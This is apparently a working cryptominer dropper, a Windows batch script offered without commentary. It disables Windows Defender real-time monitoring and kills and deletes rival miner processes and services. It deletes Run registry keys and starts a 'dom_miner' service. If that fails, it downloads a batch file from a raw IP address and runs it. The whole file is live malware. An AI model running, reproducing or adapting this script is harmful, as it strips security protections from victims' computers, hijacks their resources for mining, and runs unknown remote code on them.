@echo off

powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"

taskkill /IM logback.exe /f
taskkill /IM network02.exe /f
taskkill /IM ws_TomcatService.exe
sc stop c3pool_miner
sc delete c3pool_miner
taskkill /IM kthmimu.exe /f
taskkill /IM nazi.exe /f
taskkill /IM RuntimeBrokerService.exe /f
taskkill /IM wuaucltservice.exe /f
taskkill /IM java.exe /f
del %TEMP%\network02.exe
del %TEMP%\kthmimu.exe
del %APPDATA%\network02.exe
del %TEMP%\java.exe
rmdir /q /s C:\Windows\System32\temp
sc stop moneroocean_miner
sc delete moneroocean_miner

REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Run2" /f
REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Run" /f


REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Run2" /f
REG DELETE "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Run" /f
tasklist /fi "imagename eq jin.exe" | find ":" >NUL
if not %errorlevel% == 0 (
  echo now is running
  exit /b 1
)


:exist1
tasklist /fi "imagename eq dom.exe" | find ":" >NUL
if not %errorlevel% == 0 (
  echo now is running
  exit /b 1
)

echo [*] Starting dom_miner service
"%USERPROFILE%\dom\dsm.exe" start dom_miner
if errorlevel 1 (
  echo ERROR: Can't start jin_miner service
  goto add_it
)

exit /b 1


:add_it
echo form exist1
powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://150.129.234.203:82/mad.bat', $tempfile); & $tempfile ; Remove-Item -Force $tempfile"